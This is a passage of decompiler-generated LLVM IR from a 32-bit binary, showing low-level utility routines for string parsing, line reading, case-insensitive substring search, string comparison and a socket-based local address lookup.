  %v2_12e40 = inttoptr i32 %v5_12e14 to i8*
  %v3_12e40 = load i8, i8* %v2_12e40, align 1
  %v4_12e40 = zext i8 %v3_12e40 to i32
  store i32 %v4_12e40, i32* %r4.global-to-local, align 4
  %v6_12e40 = add i32 %v0_12e14, 2
  store i32 %v6_12e40, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_12e4c

dec_label_pc_12e4c:                               ; preds = %bb48, %dec_label_pc_12e3c, %dec_label_pc_12f14
  %storemerge1 = phi i32 [ -2147483648, %dec_label_pc_12f14 ], [ 2147483647, %dec_label_pc_12e3c ], [ 2147483647, %bb48 ]
  %storemerge = phi i32 [ 1, %dec_label_pc_12f14 ], [ 0, %dec_label_pc_12e3c ], [ 0, %bb48 ]
  store i32 %storemerge, i32* %sl.global-to-local, align 4
  %v2_12e54 = call i32 @function_133f8(i32 %storemerge1, i32 %arg2)
  %v0_12e58 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_12e58, i32* @r1, align 4
  store i32 %v2_12e54, i32* %r8.global-to-local, align 4
  store i32 %storemerge1, i32* @r0, align 4
  %v0_12e64 = call i32 @function_132e8()
  store i32 %v0_12e64, i32* @lr, align 4
  %v0_12e74.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12e74

dec_label_pc_12e74:                               ; preds = %.thread8, %dec_label_pc_12e4c
  %v2_12ef011 = phi i32 [ %v1_12f0c26, %.thread8 ], [ 0, %dec_label_pc_12e4c ]
  %v1_12ecc = phi i32 [ %v0_12f0024, %.thread8 ], [ 0, %dec_label_pc_12e4c ]
  %v1_12eb4 = phi i32 [ %v3_12ef8, %.thread8 ], [ %v0_12e74.pre, %dec_label_pc_12e4c ]
  %v1_12e74 = urem i32 %v1_12eb4, 256
  %v1_12e78 = add nsw i32 %v1_12e74, -48
  %v1_12e80 = add nsw i32 %v1_12e74, -97
  %v1_12e84 = add i32 %v1_12eb4, -48
  %v1_12e88 = add nsw i32 %v1_12e74, -65
  %tmp71 = icmp ult i32 %v1_12e78, 10
  br i1 %tmp71, label %dec_label_pc_12eb8, label %dec_label_pc_12e90

dec_label_pc_12e90:                               ; preds = %dec_label_pc_12e74
  %v2_12e90 = icmp ugt i32 %v1_12e88, 24
  %v7_12e90 = icmp eq i32 %v1_12e88, 25
  %v2_12e94 = xor i1 %v7_12e90, true
  %v3_12e94 = and i1 %v2_12e90, %v2_12e94
  br i1 %v3_12e94, label %bb49, label %bb50

bb49:                                             ; preds = %dec_label_pc_12e90
  br label %bb50

bb50:                                             ; preds = %dec_label_pc_12e90, %bb49
  %v0_12ea820 = phi i32 [ %v1_12e84, %dec_label_pc_12e90 ], [ 0, %bb49 ]
  %v2_12e98 = xor i1 %v2_12e90, true
  %v3_12e98 = or i1 %v7_12e90, %v2_12e98
  br i1 %v3_12e98, label %bb51, label %bb52

bb51:                                             ; preds = %bb50
  br label %bb52

bb52:                                             ; preds = %bb50, %bb51
  %v0_12ea8 = phi i32 [ %v0_12ea820, %bb50 ], [ 1, %bb51 ]
  br i1 %v3_12e94, label %bb53, label %bb54

bb53:                                             ; preds = %bb52
  %v6_12ea0 = icmp ugt i32 %v1_12e80, 24
  %v11_12ea0 = icmp eq i32 %v1_12e80, 25
  br label %bb54

bb54:                                             ; preds = %bb52, %bb53
  %v1_12ea4 = phi i1 [ %v7_12e90, %bb52 ], [ %v11_12ea0, %bb53 ]
  %v0_12ea4 = phi i1 [ %v2_12e90, %bb52 ], [ %v6_12ea0, %bb53 ]
  %v2_12ea4 = xor i1 %v1_12ea4, true
  %v3_12ea4 = and i1 %v0_12ea4, %v2_12ea4
  br i1 %v3_12ea4, label %dec_label_pc_12f00, label %dec_label_pc_12ea8

dec_label_pc_12ea8:                               ; preds = %bb54
  %v2_12ea8 = icmp eq i32 %v0_12ea8, 0
  %. = select i1 %v2_12ea8, i32 87, i32 55
  %v2_12eb4 = sub i32 %v1_12eb4, %.
  br label %dec_label_pc_12eb8

dec_label_pc_12eb8:                               ; preds = %dec_label_pc_12e74, %dec_label_pc_12ea8
  %v0_12ecc34 = phi i32 [ %v1_12e88, %dec_label_pc_12e74 ], [ %., %dec_label_pc_12ea8 ]
  %v3_12ef012 = phi i32 [ %v1_12e84, %dec_label_pc_12e74 ], [ %v2_12eb4, %dec_label_pc_12ea8 ]
  %v1_12eb8 = load i32, i32* %r6.global-to-local, align 4
  %v6_12ebc = icmp slt i32 %v3_12ef012, %v1_12eb8
  br i1 %v6_12ebc, label %dec_label_pc_12ec0, label %dec_label_pc_12f00

dec_label_pc_12ec0:                               ; preds = %dec_label_pc_12eb8
  %v3_12ec0 = icmp uge i32 %v2_12ef011, %v0_12e64
  %v9_12ec0 = icmp eq i32 %v2_12ef011, %v0_12e64
  %v2_12ec4 = xor i1 %v3_12ec0, true
  %v3_12ec4 = or i1 %v9_12ec0, %v2_12ec4
  br i1 %v3_12ec4, label %bb57, label %bb58

bb57:                                             ; preds = %dec_label_pc_12ec0
  br label %bb58

bb58:                                             ; preds = %dec_label_pc_12ec0, %bb57
  %v0_12ecc33 = phi i32 [ %v0_12ecc34, %dec_label_pc_12ec0 ], [ 0, %bb57 ]
  %v2_12ec8 = xor i1 %v9_12ec0, true
  %v3_12ec8 = and i1 %v3_12ec0, %v2_12ec8
  br i1 %v3_12ec8, label %bb59, label %bb60

bb59:                                             ; preds = %bb58
  br label %bb60

bb60:                                             ; preds = %bb58, %bb59
  %v0_12ecc = phi i32 [ %v0_12ecc33, %bb58 ], [ 1, %bb59 ]
  %tmp72 = icmp slt i32 %v1_12ecc, 0
  %v4_12ecc = zext i1 %tmp72 to i32
  %v5_12ecc = or i32 %v0_12ecc, %v4_12ecc
  %v7_12ecc = icmp eq i32 %v5_12ecc, 0
  br i1 %v7_12ecc, label %dec_label_pc_12ed8, label %.thread8

dec_label_pc_12ed8:                               ; preds = %bb60
  %v1_12ee4 = load i32, i32* %r8.global-to-local, align 4
  %v7_12ee8 = icmp sgt i32 %v3_12ef012, %v1_12ee4
  br i1 %v7_12ee8, label %bb63, label %.thread5

.thread5:                                         ; preds = %dec_label_pc_12ed8
  br label %bb64

bb63:                                             ; preds = %dec_label_pc_12ed8
  %v2_12eec = icmp eq i1 %v9_12ec0, false
  br i1 %v2_12eec, label %bb64, label %.thread8

bb64:                                             ; preds = %bb63, %.thread5
  %v4_12ef013 = mul i32 %v1_12eb8, %v2_12ef011
  %v5_12ef014 = add i32 %v4_12ef013, %v3_12ef012
  br label %.thread8

.thread8:                                         ; preds = %bb63, %bb60, %bb64
  %v1_12f0c26 = phi i32 [ %v2_12ef011, %bb63 ], [ %v2_12ef011, %bb60 ], [ %v5_12ef014, %bb64 ]
  %v0_12f0024 = phi i32 [ -1, %bb63 ], [ -1, %bb60 ], [ 1, %bb64 ]
  %v0_12ef8 = load i32, i32* %r5.global-to-local, align 4
  %v1_12ef8 = inttoptr i32 %v0_12ef8 to i8*
  %v2_12ef8 = load i8, i8* %v1_12ef8, align 1
  %v3_12ef8 = zext i8 %v2_12ef8 to i32
  store i32 %v3_12ef8, i32* %r4.global-to-local, align 4
  %v5_12ef8 = add i32 %v0_12ef8, 1
  store i32 %v5_12ef8, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_12e74

dec_label_pc_12f00:                               ; preds = %dec_label_pc_12eb8, %bb54
  %v1_12f00 = icmp slt i32 %v1_12ecc, 0
  %v0_12f24 = load i32, i32* %sl.global-to-local, align 4
  %v2_12f24 = icmp eq i32 %v0_12f24, 0
  br i1 %v1_12f00, label %dec_label_pc_12f24, label %dec_label_pc_12f08

dec_label_pc_12f08:                               ; preds = %dec_label_pc_12f00
  br i1 %v2_12f24, label %bb66, label %bb65

bb65:                                             ; preds = %dec_label_pc_12f08
  %v2_12f0c = sub i32 0, %v2_12ef011
  br label %bb66

bb66:                                             ; preds = %dec_label_pc_12f08, %bb65
  %v23_12f10 = phi i32 [ %v2_12ef011, %dec_label_pc_12f08 ], [ %v2_12f0c, %bb65 ]
  %v2_12f10 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_12f10, i32* @r4, align 4
  ret i32 %v23_12f10

dec_label_pc_12f14:                               ; preds = %dec_label_pc_12e34
  %v1_12f14 = inttoptr i32 %v5_12e14 to i8*
  %v2_12f14 = load i8, i8* %v1_12f14, align 1
  %v3_12f14 = zext i8 %v2_12f14 to i32
  store i32 %v3_12f14, i32* %r4.global-to-local, align 4
  %v5_12f14 = add i32 %v0_12e14, 2
  store i32 %v5_12f14, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_12e4c

dec_label_pc_12f24:                               ; preds = %dec_label_pc_12f00
  %.70 = select i1 %v2_12f24, i32 2147483647, i32 -2147483648
  %v2_12f30 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_12f30, i32* @r4, align 4
  ret i32 %.70

; uselistorder directives
  uselistorder i32 %v3_12ef8, { 1, 0 }
  uselistorder i1 %v9_12ec0, { 1, 0, 2 }
  uselistorder i1 %v3_12ec0, { 1, 0 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i1 %v7_12e90, { 1, 2, 0 }
  uselistorder i1 %v2_12e90, { 1, 0, 2 }
  uselistorder i32 %v1_12e74, { 1, 2, 0 }
  uselistorder i32 %v1_12eb4, { 1, 2, 0 }
  uselistorder i32 %v1_12ecc, { 1, 0 }
  uselistorder i32 %v2_12ef011, { 0, 1, 6, 3, 2, 4, 5 }
  uselistorder i32 %v0_12e64, { 1, 0, 2 }
  uselistorder i32 %v5_12e14, { 3, 4, 5, 2, 1, 0 }
  uselistorder i32 %v3_12e14, { 1, 0 }
  uselistorder i32 %v0_12e14, { 0, 1, 3, 2 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 4, 3, 5, 0 }
  uselistorder i8 9, { 7, 0, 5, 1, 2, 6, 3, 4 }
  uselistorder label %bb66, { 1, 0 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %bb60, { 1, 0 }
  uselistorder label %bb58, { 1, 0 }
  uselistorder label %dec_label_pc_12eb8, { 1, 0 }
  uselistorder label %bb54, { 1, 0 }
  uselistorder label %bb52, { 1, 0 }
  uselistorder label %bb50, { 1, 0 }
  uselistorder label %dec_label_pc_12e4c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12e14, { 1, 2, 0, 3 }
}

define i32 @function_12f34(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_12f34:
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_12f34 = load i32, i32* @r4, align 4
  store i32 %v3_12f34, i32* %stack_var_-24, align 4
  store i32 %tmp, i32* %r8.global-to-local, align 4
  store i32 %arg2, i32* %r7.global-to-local, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_12f4c

dec_label_pc_12f4c:                               ; preds = %dec_label_pc_12f78.dec_label_pc_12f4c_crit_edge, %dec_label_pc_12f34
  %v0_12f50 = phi i32 [ %v0_12f50.pre, %dec_label_pc_12f78.dec_label_pc_12f4c_crit_edge ], [ %arg3, %dec_label_pc_12f34 ]
  %v0_12f4c = phi i32 [ %v1_12f64, %dec_label_pc_12f78.dec_label_pc_12f4c_crit_edge ], [ %tmp, %dec_label_pc_12f34 ]
  %tmp12 = inttoptr i32 %v0_12f4c to i32*
  %v5_12f58 = call i32 @function_13864(i32 %v0_12f50, i32* %tmp12, i32 1)
  %v7_12f5c = icmp eq i32 %v5_12f58, 1
  %v0_12f60 = load i32, i32* @r4, align 4
  %v1_12f64 = add i32 %v0_12f60, 1
  store i32 %v1_12f64, i32* @r4, align 4
  %v0_12f6c = load i32, i32* %r5.global-to-local, align 4
  br i1 %v7_12f5c, label %dec_label_pc_12f6c, label %dec_label_pc_12f84

dec_label_pc_12f6c:                               ; preds = %dec_label_pc_12f4c
  %v1_12f6c = add i32 %v0_12f6c, 1
  store i32 %v1_12f6c, i32* %r5.global-to-local, align 4
  %v0_12f70 = load i32, i32* %r7.global-to-local, align 4
  %v7_12f74 = icmp sgt i32 %v0_12f70, %v1_12f6c
  br i1 %v7_12f74, label %dec_label_pc_12f78, label %dec_label_pc_12f84

dec_label_pc_12f78:                               ; preds = %dec_label_pc_12f6c
  %v1_12f78 = inttoptr i32 %v0_12f60 to i8*
  %v2_12f78 = load i8, i8* %v1_12f78, align 1
  %v7_12f7c = icmp eq i8 %v2_12f78, 10
  br i1 %v7_12f7c, label %dec_label_pc_12f84, label %dec_label_pc_12f78.dec_label_pc_12f4c_crit_edge

dec_label_pc_12f78.dec_label_pc_12f4c_crit_edge:  ; preds = %dec_label_pc_12f78
  %v0_12f50.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_12f4c

dec_label_pc_12f84:                               ; preds = %dec_label_pc_12f4c, %dec_label_pc_12f78, %dec_label_pc_12f6c
  %v0_12f84 = phi i32 [ %v1_12f6c, %dec_label_pc_12f78 ], [ %v1_12f6c, %dec_label_pc_12f6c ], [ %v0_12f6c, %dec_label_pc_12f4c ]
  %v2_12f84 = icmp eq i32 %v0_12f84, 0
  %v1_12f88 = load i32, i32* %r8.global-to-local, align 4
  %storemerge = select i1 %v2_12f84, i32 0, i32 %v1_12f88
  %v2_12f90 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_12f90, i32* @r4, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_12f64, { 1, 0 }
  uselistorder i8 10, { 8, 1, 0, 9, 7, 10, 2, 3, 4, 5, 6 }
  uselistorder i32 (i32, i32*, i32)* @function_13864, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_12f84, { 1, 2, 0 }
}

define i32 @function_12f94() local_unnamed_addr {
dec_label_pc_12f94:
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_12f94 = load i32, i32* @r4, align 4
  store i32 16, i32* @r4, align 4
  store i32 16, i32* %stack_var_-24, align 4
  %v0_12fa4 = call i32 @function_13c70()
  store i32 0, i32* %r6.global-to-local, align 4
  %v2_12fac = inttoptr i32 %v0_12fa4 to i32*
  store i32 0, i32* %v2_12fac, align 4
  %v0_12fb8 = load i32, i32* %r6.global-to-local, align 4
  %v3_12fbc = call i32 @function_13f90(i32 2, i32 2, i32 %v0_12fb8)
  %v7_12fc8 = icmp eq i32 %v3_12fbc, -1
  store i32 %v3_12fbc, i32* %r5.global-to-local, align 4
  %v2_12fd4 = load i32, i32* @r4, align 4
  br i1 %v7_12fc8, label %dec_label_pc_13024, label %dec_label_pc_12fe8

dec_label_pc_12fe8:                               ; preds = %dec_label_pc_12f94
  %v7_12fd4 = shl i32 2056, %v2_12fd4
  %v8_12fd4 = or i32 %v7_12fd4, 2056
  store i32 2, i32* %stack_var_-40, align 4
  %v3_13004 = bitcast i32* %stack_var_-40 to %sockaddr*
  %v4_13004 = call i32 @function_13dec(i32 %v3_12fbc, %sockaddr* %v3_13004, i32 %v2_12fd4)
  %v2_1300c = ptrtoint i32* %stack_var_-24 to i32
  %v0_13010 = load i32, i32* %r5.global-to-local, align 4
  %v4_13014 = call i32 @function_13e18(i32 %v0_13010, %sockaddr* %v3_13004, i32 %v2_1300c)
  %v1_1301c = call i32 @function_1369c(i32 %v0_13010)
  br label %dec_label_pc_13024

dec_label_pc_13024:                               ; preds = %dec_label_pc_12f94, %dec_label_pc_12fe8
  %v0_13024 = phi i32 [ %v0_12fb8, %dec_label_pc_12f94 ], [ %v8_12fd4, %dec_label_pc_12fe8 ]
  store i32 %v3_12f94, i32* @r4, align 4
  ret i32 %v0_13024

; uselistorder directives
  uselistorder i32 %v3_12fbc, { 1, 2, 0 }
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32 (i32, %sockaddr*, i32)* @function_13dec, { 6, 0, 7, 1, 5, 2, 3, 4, 8 }
  uselistorder i32 2056, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_13f90, { 4, 19, 2, 3, 18, 6, 17, 16, 15, 14, 13, 12, 11, 10, 1, 9, 8, 7, 5, 0 }
  uselistorder label %dec_label_pc_13024, { 1, 0 }
}

define i32 @function_13030(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_13030:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp20 = ptrtoint i8* %arg1 to i32
  %v3_13034 = load i8, i8* %tmp, align 1
  %v2_13038 = icmp eq i8 %v3_13034, 0
  br i1 %v2_13038, label %bb, label %dec_label_pc_1304c

bb:                                               ; preds = %dec_label_pc_13030
  %v4_13034 = zext i8 %v3_13034 to i32
  br label %dec_label_pc_13060

dec_label_pc_1304c:                               ; preds = %dec_label_pc_13030
  br label %dec_label_pc_13050

dec_label_pc_13050:                               ; preds = %dec_label_pc_13050, %dec_label_pc_1304c
  %v0_13050 = phi i32 [ %v1_13050, %dec_label_pc_13050 ], [ 0, %dec_label_pc_1304c ]
  %v1_13050 = add i32 %v0_13050, 1
  %v2_13054 = add i32 %v1_13050, %arg2
  %v3_13054 = inttoptr i32 %v2_13054 to i8*
  %v4_13054 = load i8, i8* %v3_13054, align 1
  %v2_13058 = icmp eq i8 %v4_13054, 0
  br i1 %v2_13058, label %dec_label_pc_13060, label %dec_label_pc_13050

dec_label_pc_13060:                               ; preds = %dec_label_pc_13050, %bb
  %v0_130a418 = phi i32 [ %v4_13034, %bb ], [ %v1_13050, %dec_label_pc_13050 ]
  %v0_130681 = load i32, i32* @r1, align 4
  %tmp27 = icmp slt i32 %v0_130681, 1
  br i1 %tmp27, label %dec_label_pc_130b4, label %dec_label_pc_13074

dec_label_pc_13074:                               ; preds = %dec_label_pc_13060, %dec_label_pc_13068.backedge
  %v0_1306c.in = phi i32 [ %v0_1306c, %dec_label_pc_13068.backedge ], [ %v0_130681, %dec_label_pc_13060 ]
  %v0_13098 = phi i32 [ %v1_13098., %dec_label_pc_13068.backedge ], [ 0, %dec_label_pc_13060 ]
  %v0_13074 = phi i32 [ %v5_13074, %dec_label_pc_13068.backedge ], [ %tmp20, %dec_label_pc_13060 ]
  %v0_1306c = add i32 %v0_1306c.in, -1
  %v1_13074 = inttoptr i32 %v0_13074 to i8*
  %v2_13074 = load i8, i8* %v1_13074, align 1
  %v3_13074 = zext i8 %v2_13074 to i32
  store i32 %v3_13074, i32* @lr, align 4
  %v5_13074 = add i32 %v0_13074, 1
  %v2_13078 = add i32 %v0_13098, %arg2
  %v3_13078 = inttoptr i32 %v2_13078 to i8*
  %v4_13078 = load i8, i8* %v3_13078, align 1
  %v6_13078 = zext i8 %v4_13078 to i32
  %v1_1307c = add nsw i32 %v3_13074, -65
  %v1_13080 = add nsw i32 %v6_13078, -65
  %tmp35 = icmp ult i32 %v1_1307c, 26
  br i1 %tmp35, label %bb28, label %bb29

bb28:                                             ; preds = %dec_label_pc_13074
  %v5_13088 = or i32 %v3_13074, 96
  store i32 %v5_13088, i32* @lr, align 4
  br label %bb29

bb29:                                             ; preds = %dec_label_pc_13074, %bb28
  %v0_13094 = phi i32 [ %v3_13074, %dec_label_pc_13074 ], [ %v5_13088, %bb28 ]
  %tmp36 = icmp ult i32 %v1_13080, 26
  br i1 %tmp36, label %bb30, label %bb31

bb30:                                             ; preds = %bb29
  %v5_13090 = or i32 %v6_13078, 96
  br label %bb31

bb31:                                             ; preds = %bb29, %bb30
  %v1_13094 = phi i32 [ %v6_13078, %bb29 ], [ %v5_13090, %bb30 ]
  %v9_13094 = icmp eq i32 %v0_13094, %v1_13094
  %v1_13098 = add i32 %v0_13098, 1
  %v1_13098. = select i1 %v9_13094, i32 %v1_13098, i32 0
  br i1 %v9_13094, label %dec_label_pc_130a4, label %dec_label_pc_13068.backedge

dec_label_pc_13068.backedge:                      ; preds = %bb31, %dec_label_pc_130a4
  %tmp32 = icmp slt i32 %v0_1306c, 1
  br i1 %tmp32, label %dec_label_pc_130b4, label %dec_label_pc_13074

dec_label_pc_130a4:                               ; preds = %bb31
  %v9_130a4 = icmp eq i32 %v0_130a418, %v1_13098.
  br i1 %v9_130a4, label %dec_label_pc_130ac, label %dec_label_pc_13068.backedge

dec_label_pc_130ac:                               ; preds = %dec_label_pc_130a4
  %v2_130ac = sub i32 %v5_13074, %tmp20
  ret i32 %v2_130ac

dec_label_pc_130b4:                               ; preds = %dec_label_pc_13068.backedge, %dec_label_pc_13060
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v1_13098., { 1, 0 }
  uselistorder i32 %v0_13074, { 1, 0 }
  uselistorder i32 %v0_13098, { 1, 0 }
  uselistorder i8 %v3_13034, { 1, 0 }
  uselistorder i32 %tmp20, { 1, 0 }
  uselistorder label %dec_label_pc_13068.backedge, { 1, 0 }
  uselistorder label %bb31, { 1, 0 }
  uselistorder label %bb29, { 1, 0 }
  uselistorder label %dec_label_pc_13074, { 1, 0 }
}

define i32 @function_130bc(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_130bc:
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_130bc = load i8, i8* %arg1, align 1
  %v2_130c0 = icmp eq i8 %v2_130bc, 0
  br i1 %v2_130c0, label %bb, label %dec_label_pc_130cc

bb:                                               ; preds = %dec_label_pc_130bc
  %v3_130bc = zext i8 %v2_130bc to i32
  br label %dec_label_pc_130e0

dec_label_pc_130cc:                               ; preds = %dec_label_pc_130bc
  br label %dec_label_pc_130d0

dec_label_pc_130d0:                               ; preds = %dec_label_pc_130d0, %dec_label_pc_130cc
  %v0_130d0 = phi i32 [ %v1_130d0, %dec_label_pc_130d0 ], [ 0, %dec_label_pc_130cc ]
  %v1_130d0 = add i32 %v0_130d0, 1
  %v2_130d4 = add i32 %v1_130d0, %tmp
  %v3_130d4 = inttoptr i32 %v2_130d4 to i8*
  %v4_130d4 = load i8, i8* %v3_130d4, align 1
  %v2_130d8 = icmp eq i8 %v4_130d4, 0
  br i1 %v2_130d8, label %dec_label_pc_130e0, label %dec_label_pc_130d0

dec_label_pc_130e0:                               ; preds = %dec_label_pc_130d0, %bb
  %v1_13104 = phi i32 [ %v3_130bc, %bb ], [ %v1_130d0, %dec_label_pc_130d0 ]
  %v1_130e0 = inttoptr i32 %arg2 to i8*
  %v2_130e0 = load i8, i8* %v1_130e0, align 1
  %v3_130e0 = zext i8 %v2_130e0 to i32
  %v2_130e4 = icmp eq i8 %v2_130e0, 0
  br i1 %v2_130e4, label %bb22, label %dec_label_pc_130f0

bb22:                                             ; preds = %dec_label_pc_130e0
  store i32 %v3_130e0, i32* @r2, align 4
  br label %dec_label_pc_13104

dec_label_pc_130f0:                               ; preds = %dec_label_pc_130e0
  br label %dec_label_pc_130f4

dec_label_pc_130f4:                               ; preds = %dec_label_pc_130f4, %dec_label_pc_130f0
  %v0_130f4 = phi i32 [ %v1_130f4, %dec_label_pc_130f4 ], [ 0, %dec_label_pc_130f0 ]
  %v1_130f4 = add i32 %v0_130f4, 1
  store i32 %v1_130f4, i32* @r2, align 4
  %v2_130f8 = add i32 %v1_130f4, %arg2
  %v3_130f8 = inttoptr i32 %v2_130f8 to i8*
  %v4_130f8 = load i8, i8* %v3_130f8, align 1
  %v2_130fc = icmp eq i8 %v4_130f8, 0
  br i1 %v2_130fc, label %dec_label_pc_13104, label %dec_label_pc_130f4

dec_label_pc_13104:                               ; preds = %dec_label_pc_130f4, %bb22
  %v0_131304 = phi i32 [ %v3_130e0, %bb22 ], [ %v1_130f4, %dec_label_pc_130f4 ]
  %v9_13104 = icmp eq i32 %v0_131304, %v1_13104
  br i1 %v9_13104, label %dec_label_pc_13130.preheader, label %dec_label_pc_13110

dec_label_pc_13130.preheader:                     ; preds = %dec_label_pc_13104
  %v2_131306 = icmp eq i32 %v1_13104, 0
  br i1 %v2_131306, label %dec_label_pc_13138, label %dec_label_pc_13118

dec_label_pc_13110:                               ; preds = %dec_label_pc_13118, %dec_label_pc_13104
  ret i32 0

dec_label_pc_13118:                               ; preds = %dec_label_pc_13128, %dec_label_pc_13130.preheader
  %v0_13130.in = phi i32 [ %v0_13130, %dec_label_pc_13128 ], [ %v1_13104, %dec_label_pc_13130.preheader ]
  %v0_1312c = phi i32 [ %v1_1312c, %dec_label_pc_13128 ], [ %arg2, %dec_label_pc_13130.preheader ]
  %v0_13128 = phi i32 [ %v1_13128, %dec_label_pc_13128 ], [ %tmp, %dec_label_pc_13130.preheader ]
  %v0_13130 = add i32 %v0_13130.in, -1
  %v1_13118 = inttoptr i32 %v0_13128 to i8*
  %v2_13118 = load i8, i8* %v1_13118, align 1
  %v3_13118 = zext i8 %v2_13118 to i32
  store i32 %v3_13118, i32* @r2, align 4
  %v1_1311c = inttoptr i32 %v0_1312c to i8*
  %v2_1311c = load i8, i8* %v1_1311c, align 1
  %v9_13120 = icmp eq i8 %v2_13118, %v2_1311c
  br i1 %v9_13120, label %dec_label_pc_13128, label %dec_label_pc_13110

dec_label_pc_13128:                               ; preds = %dec_label_pc_13118
  %v1_13128 = add i32 %v0_13128, 1
  %v1_1312c = add i32 %v0_1312c, 1
  %v2_13130 = icmp eq i32 %v0_13130, 0
  br i1 %v2_13130, label %dec_label_pc_13138, label %dec_label_pc_13118

dec_label_pc_13138:                               ; preds = %dec_label_pc_13128, %dec_label_pc_13130.preheader
  ret i32 1

; uselistorder directives
  uselistorder i32 %v1_130f4, { 0, 1, 3, 2 }
  uselistorder i8 %v2_130bc, { 1, 0 }
}

define i32 @function_13140(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_13140:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_13144 = load i8, i8* %arg1, align 1
  %v2_13148 = icmp eq i8 %v2_13144, 0
  %v0_1314c = load i32, i32* %r2.global-to-local, align 4
  br i1 %v2_13148, label %bb, label %dec_label_pc_13158

bb:                                               ; preds = %dec_label_pc_13140
  %v3_13144 = zext i8 %v2_13144 to i32
  br label %dec_label_pc_1316c

dec_label_pc_13158:                               ; preds = %dec_label_pc_13140
  br label %dec_label_pc_1315c

dec_label_pc_1315c:                               ; preds = %dec_label_pc_1315c, %dec_label_pc_13158
  %v0_1315c = phi i32 [ %v1_1315c, %dec_label_pc_1315c ], [ 0, %dec_label_pc_13158 ]
  %v1_1315c = add i32 %v0_1315c, 1
  %v2_13160 = add i32 %v1_1315c, %tmp
  %v3_13160 = inttoptr i32 %v2_13160 to i8*
  %v4_13160 = load i8, i8* %v3_13160, align 1
  %v2_13164 = icmp eq i8 %v4_13160, 0
  br i1 %v2_13164, label %dec_label_pc_1316c, label %dec_label_pc_1315c

dec_label_pc_1316c:                               ; preds = %dec_label_pc_1315c, %bb
  %v9_13194 = phi i32 [ %v3_13144, %bb ], [ %v1_1315c, %dec_label_pc_1315c ]
  %v0_1316c = load i32, i32* %r1.global-to-local, align 4
  %v1_1316c = inttoptr i32 %v0_1316c to i8*
  %v2_1316c = load i8, i8* %v1_1316c, align 1
  %v3_1316c = zext i8 %v2_1316c to i32
  %v2_13170 = icmp eq i8 %v2_1316c, 0
  br i1 %v2_13170, label %bb26, label %dec_label_pc_1317c

bb26:                                             ; preds = %dec_label_pc_1316c
  store i32 %v3_1316c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13190

dec_label_pc_1317c:                               ; preds = %dec_label_pc_1316c
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13180

dec_label_pc_13180:                               ; preds = %dec_label_pc_13180, %dec_label_pc_1317c
  %v0_13180 = phi i32 [ %v1_13180, %dec_label_pc_13180 ], [ 0, %dec_label_pc_1317c ]
  %v1_13180 = add i32 %v0_13180, 1
  store i32 %v1_13180, i32* %r2.global-to-local, align 4
  %v2_13184 = add i32 %v1_13180, %v0_1316c
  %v3_13184 = inttoptr i32 %v2_13184 to i8*
  %v4_13184 = load i8, i8* %v3_13184, align 1
  %v2_13188 = icmp eq i8 %v4_13184, 0
  br i1 %v2_13188, label %dec_label_pc_13190, label %dec_label_pc_13180

dec_label_pc_13190:                               ; preds = %dec_label_pc_13180, %bb26
  %v1_13190 = phi i32 [ %v3_1316c, %bb26 ], [ %v1_13180, %dec_label_pc_13180 ]
  %v2_13190 = sub i32 %v0_1314c, %v1_13190
  %v4_13190 = xor i32 %v1_13190, %v0_1314c
  %v5_13190 = xor i32 %v2_13190, %v0_1314c
  %v6_13190 = and i32 %v5_13190, %v4_13190
  %v7_13194 = icmp sgt i32 %v0_1314c, %v1_13190
  br i1 %v7_13194, label %bb28, label %bb27

bb27:                                             ; preds = %dec_label_pc_13190
  %v10_13194 = sub i32 %v0_1314c, %v9_13194
  %v12_13194 = xor i32 %v9_13194, %v0_1314c
  %v13_13194 = xor i32 %v10_13194, %v0_1314c
  %v14_13194 = and i32 %v13_13194, %v12_13194
  br label %bb28

bb28:                                             ; preds = %dec_label_pc_13190, %bb27
  %v2_13198.in = phi i32 [ %v6_13190, %dec_label_pc_13190 ], [ %v14_13194, %bb27 ]
  %v1_13198.in = phi i32 [ %v2_13190, %dec_label_pc_13190 ], [ %v10_13194, %bb27 ]
  %v1_13190.pn = phi i32 [ %v1_13190, %dec_label_pc_13190 ], [ %v9_13194, %bb27 ]
